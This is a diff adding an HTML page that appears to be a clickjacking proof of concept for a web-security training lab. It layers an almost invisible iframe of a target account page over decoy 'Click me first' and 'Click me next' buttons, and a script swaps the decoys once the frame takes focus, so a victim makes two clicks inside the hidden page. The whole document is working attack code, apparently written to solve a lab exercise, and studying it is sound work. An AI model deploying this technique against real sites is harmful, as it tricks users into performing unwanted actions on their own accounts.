@@ -1,0 +1,57 @@
+<head>
+    <style>
+        #target_website {
+            position:relative;
+            width:600px;
+            height:600px;
+            opacity:0.00001;
+            z-index:2;
+            }
+        #decoy_website_first {
+            position:absolute;
+            width:300px;
+            height:400px;
+            z-index:1;
+            }
+        #decoy_website_next {
+            position:absolute;
+            width:300px;
+            height:400px;
+            z-index:1;
+            }
+        #button_first {
+          text-align: center;
+          display: inline-block;
+          font-size: 14px;
+          margin: 480px 35px;
+          width: 110px;
+        }
+        #button_next {
+          text-align: center;
+          display: inline-block;
+          font-size: 14px;
+          margin: 280px 190px;
+          width: 110px;
+        }
+    </style>
+    <script>
+        var monitor = setInterval(function(){
+            var elem = document.activeElement;
+            if(elem && elem.tagName == 'IFRAME'){
+                    decoy_website_first.setAttribute("hidden", true);
+                    decoy_website_next.removeAttribute("hidden");
+                    clearInterval(monitor);
+                }
+        }, 100);
+    </script>
+</head>
+<body>
+<div id="decoy_website_first">
+    <button id="button_first">Click me first</button>
+</div>
+<div id="decoy_website_next" hidden>
+    <button id="button_next">Click me next</button>
+</div>
+<iframe id="target_website" src="https://???.web-security-academy.net/my-account">
+</iframe>
+</body>
